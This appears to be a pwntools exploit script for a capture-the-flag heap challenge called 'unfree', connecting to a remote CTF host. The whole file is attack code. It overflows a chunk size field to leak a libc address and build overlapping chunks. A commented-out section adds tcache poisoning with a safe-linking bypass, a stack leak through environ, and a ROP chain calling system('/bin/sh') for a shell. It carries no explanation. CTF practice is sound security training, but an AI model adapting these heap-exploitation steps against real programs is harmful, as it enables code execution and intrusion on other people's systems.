#!/usr/bin/python3

from pwn import *

exe = ELF('unfree_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1506

        c
        ''')
        input()


if args.REMOTE:
    p = remote('unfree.ctfz.zone', 17171)
else:
    p = process(exe.path)
GDB()
def add(idx, sz, pa):
    sla(b"Exit", b'1')
    sla(b"add", str(idx))
    sla(b"size", str(sz))
    sa(b"data", pa)
def edit(idx, pa):
    sla(b"Exit", b'2')
    sla(b"edit", str(idx))
    sa(b"data", (pa))
def read(idx):
    sla(b"Exit", b'3')
    sla(b"read", str(idx))
add(0, 0x10, b'wan')
edit(0, b'wan'.ljust(0x10) + flat(0, 0xd51))
add(1, 0xe00+0x180, b'\0'*0xe00 + b'wanwan')
add(2, 0xd20, b'\x01')
read(2)
libcc= (p.recvline(keepends=False))
libc.address = u64(p.recv(6)+b'\0\0') - 0x203b01
print(hex(libc.address))

edit(1, b'a'*0xf80 + flat(0, 0x71)) 
add(3, 0xf88, b'wanwan') 
edit(3, b'a'.ljust(0xf80) + flat(0, 0x71)) 
add(4, 0xf88, b'wanwan') 
edit(1, b'a'*(0xf80+0x10))
read(1)
# p.recvuntil(b'a'*(0xe00+0x180+0x10))
# heap = (u64(p.recvline()[:-1].ljust(8, b'\0')) << 12) - 0x21000
# info("heap: " + hex(heap))

# edit(3, b'b'*(0xf80) + flat(0, 0x51, (libc.sym.environ-0x18) ^ (heap+0x43fa0 >> 12)
#      ))
# add(5, 0x40, b'wan')
# add(6, 0x40, b'a'*0x18)
# read(6)
# p.recvuntil(b'a'*0x18)
# stack = u64(p.recvline()[:-1] + b'\0\0')
# info("stack " + hex(stack))
# target = stack - 0x160

# edit(4, b'a'*(0xf80) + flat(0, 0x71))
# add(7, 0xf88, b'wanwan')
# edit(7, b'a'*(0xf80) + flat(0, 0x71))
# add(8, 0xf80, b'wanwan')
# edit(7, b'a'*(0xf80) + flat(0, 0x51,
#                                  (target-8) ^ (heap+0x87fa0 >> 12)))
# add(9, 0x40, b'wan')
# rop = ROP(libc)
# rop.system(next(libc.search(b'/bin/sh')))
# add(10, 0x40, b'a'*8 + p64(rop.find_gadget(['ret'])[0]) + bytes(rop))
p.interactive()
